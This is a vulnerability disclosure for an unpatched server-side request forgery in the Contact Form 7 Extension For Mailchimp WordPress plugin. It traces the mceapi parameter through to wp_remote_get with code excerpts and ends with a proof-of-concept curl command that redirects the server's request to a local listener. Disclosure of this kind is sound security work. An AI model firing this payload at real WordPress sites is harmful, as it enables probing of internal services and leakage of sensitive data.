### Contact Form 7 Extension For Mailchimp load list function is vulnerable to SSRF causing information leak

- **Application**: Contact Form 7 Extension For Mailchimp <= 0.5.70

- **Status**: Confirmed, not patched yet

- **Threat Impact**: Sensitive data leakage

- **Code**:  The API is passed in through `mceapi` POST parameter. It is then saved into database. Later it is read back from database and split using the `-` character. The second part after split is used as the host of the URL, which is passed into `callApiGet` and finally used by sink `wp_remote_get`

  File: `lib/find.php`

  ```
  function wpcf7_mce_loadlistas(){
    mceapi = isset($_POST['mceapi']) ? $_POST['mceapi'] : 0;
    ...
    $tmppost = $tmppost + array('api' => $mceapi);
    update_option($mce_idformxx, $tmppost);
    ...
    $cf7_mch = get_option($mce_idformxx, $cf7_mch_defaults);
    $api = $cf7_mch['api'];
    $dc = explode("-", $api);
    $urlmcv3 = "https://$dc[1].api.mailchimp.com/3.0";
    ...
    $url_get_merge_fields = "$urlmcv3/lists/$list/merge-fields";  //// $urlmcv3
    $arraymerger_ = callApiGet($dc[0], $url_get_merge_fields);
  }
  
  function callApiGet($token, $url) {
    ...
    $mergerfield = wp_remote_get($url, $header);
  }
  ```

  File: `option.php`

  ```
  function update_option( $option, $value, $autoload = null ) {
    ...
    $serialized_value = maybe_serialize( $value );
    ...
    $update_args = array(
  		'option_value' => $serialized_value,
  	);
    ...
    $result = $wpdb->update( $wpdb->options, $update_args, array( 'option_name' => $option ) );
  }
  ```

- **POC**:
  1. Listen on 8888 on server side
  1. Login to get cookie
  1. Send a post request through curl: `curl -X POST http://127.0.0.1:28000/wp-admin/admin-ajax.php\?action\=wpcf7_mce_loadlistas -d "mceapi=-ssrf.localdomain.pw%2Fcustom%252D30x%2F%3Fcode%3D301%26url%3Dhttp%3A%2F%2F127.0.0.1%3A8888%26a%3D" --cookie "wordpress_cookie"`
  1. Receive a request on server side. 
